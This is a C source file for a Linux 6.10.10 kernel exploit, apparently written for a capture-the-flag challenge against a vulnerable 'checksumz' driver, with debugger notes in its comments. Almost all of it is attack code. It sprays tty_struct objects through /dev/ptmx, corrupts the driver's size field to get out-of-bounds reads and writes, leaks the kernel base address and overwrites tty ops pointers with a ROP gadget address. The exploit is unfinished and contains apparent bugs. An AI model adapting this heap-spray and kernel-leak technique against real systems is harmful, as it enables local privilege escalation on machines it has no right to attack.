#include "api.h"
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

void io_digest(int fd) {
    uint32_t digest = 0;
    if (ioctl(fd, CHECKSUMZ_IOCTL_DIGEST, &digest) < 0) {
        perror("ioctl - CHECKSUMZ_IOCTL_DIGEST");
    } else {
        printf("Computed digest: 0x%08X\n", digest);
    }
}

void write_48(int fd, uint64_t* data) {
    if (ioctl(fd, CHECKSUMZ_IOCTL_RENAME, data) < 0) {
        perror("ioctl - CHECKSUMZ_IOCTL_RENAME");
    }
}

void write_relative(int fd, int offset, uint64_t data) {
    lseek(fd, offset, SEEK_SET);
    //const char *my_data = "\xaa\xbb\xcc\xdd\xee";
    //$5 = 0xeeddccbb

    ssize_t wbytes = write(fd, &data, sizeof(data));
    if (wbytes < 0) {
        perror("write");
    } else {
        printf("Wrote %zd bytes\n", wbytes);
    }
}

void write_global(int fd, uint64_t ptr, uint64_t* data) {
    write_relative(fd, 0x210, ptr);
    write_48(fd, data);
}

uint64_t io_read(int fd, int offset) {

    lseek(fd, offset, SEEK_SET);
    uint64_t x;
    memset(&x, 0, sizeof(x));
    ssize_t rbytes = read(fd, &x, sizeof(x));
    if (rbytes < 0) {
        perror("read");
    } else {
        printf("Read %zd bytes: '%.*s'\n", rbytes, (int)rbytes, (char*)&x);
    }

    printf("(~) %lx\n", x);
    return x;
}


/*
 
 version: Linux 6.10.10
 due to the module's struct size:

struct checksum_buffer {
	loff_t pos;
	char state[0x200];
	size_t size;
	size_t read;
	char* name; // offset 0x210 from state ptr; because name is allocd with 1000 we know it'll be in kmalloc-1024 as well
	uint32_t s1;
	uint32_t s2;
};

 we expect it to be allocated to kmalloc-1024
 @note: maybe verify with grep kmalloc-1024 /proc/slabinfo
 given that, we know that tty_struct can be used [1].

struct tty_struct {
	struct kref kref;
	int index;
	struct device *dev;
	struct tty_driver *driver;
	struct tty_port *port;
	const struct tty_operations *ops; // 0x28 offset

04:0020│  0xff11000004967420 —▸ 0xffffffff82289360 (pty_unix98_ops) —▸ 0xffffffff8163e4c0 (pts_unix98_lookup) ◂— endbr64
05:0028│  0xff11000004967428 —▸ 0xff110000045dc700 —▸ 0xffffffff82bd14a0 (n_tty_ops) —▸ 0xffffffff82722080 (.LC3+121) ◂— 0x7264007974745f6e / 'n_tty' /


 [1]: https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628

 */

#define SPRAY_SZ 0x100

int main() {

    // spray sandwich below:
    // the sprayed objs are tty_struct
    // ref: https://elixir.bootlin.com/linux/v6.10.10/source/include/linux/tty.h#L188
    //
    // spray before (bread)
    int spray[SPRAY_SZ];
    for(int i = 0; i < SPRAY_SZ / 2; i++) {
        spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }

    // object with overflow (cheese)
    int fd = open("/dev/checksumz", O_RDWR);

    // spray after (bread)
    for(int i = SPRAY_SZ / 2; i < SPRAY_SZ; i++) {
        spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }


    write_relative(fd, 0x200, 0xffffffff); // change size
    uint64_t name_heap_addr = io_read(fd, 0x210); // &state->name
    printf("(~) state->name %016lx\n", name_heap_addr);


    uint64_t payload[6];
    payload[0] = name_heap_addr;
    payload[1] = name_heap_addr;
    payload[2] = name_heap_addr;
    payload[3] = name_heap_addr;
    payload[4] = name_heap_addr;
    payload[5] = name_heap_addr;

    uint64_t payload_b[6];
    payload[0] = 0xffffffff8344fcbd;
    payload[1] = 0xffffffff8344fcbd;
    payload[2] = 0xffffffff8344fcbd;
    payload[3] = 0xffffffff8344fcbd;
    payload[4] = 0xffffffff8344fcbd;
    payload[5] = 0xffffffff8344fcbd;

    // 0xffffffff8344fcbd : xor sil, dil ; ret
    //write_48(fd, payload_b);
    write_48(fd, (uint64_t*)"new name test");
    //printf("(~)%016lx, confirming write...\n", io_read(fd, 0x210));


    uint64_t kbase = 0;

    for (int i = 1; i <= 8; i++) {
        uint64_t kbase_leak = io_read(fd, 0x400 * i + (3 * 0x8)); // next kmalloc-1024 slot
        if (kbase_leak < 0xffffffff81000000) continue; 

        printf("(~) kbase_leak %016lx\n", kbase_leak);
        //ref: https://elixir.bootlin.com/linux/v6.10.10/source/drivers/tty/pty.c#L745
        uint64_t ptm_unix98_ops_offset = 0xffffffff82289360 - 0xffffffff81000000;
        kbase = (kbase_leak - ptm_unix98_ops_offset) & 0xffffffffffff0000;
        break;
    }


    printf("(!) KBASE: %016lx\n", kbase);

    for(int i = 0; i < 4; i++) {
        uint64_t ptr = name_heap_addr + 0x400 * (i+1) + 0x20;
        printf("(~) writing to base %016lx + 0x20\n", ptr - 0x20);
        write_global(fd, ptr, payload);
    }
}
/*

ffffffffc0000350
ffffffffc01bf350
ffffffffc02ed350



pwndbg> p &((struct checksum_buffer*)$rbx)->state
$5 = (char (*)[512]) 0xff11000004514008
pwndbg> p &((struct checksum_buffer*)$rbx)->size
$6 = (size_t *) 0xff11000004514208

*/
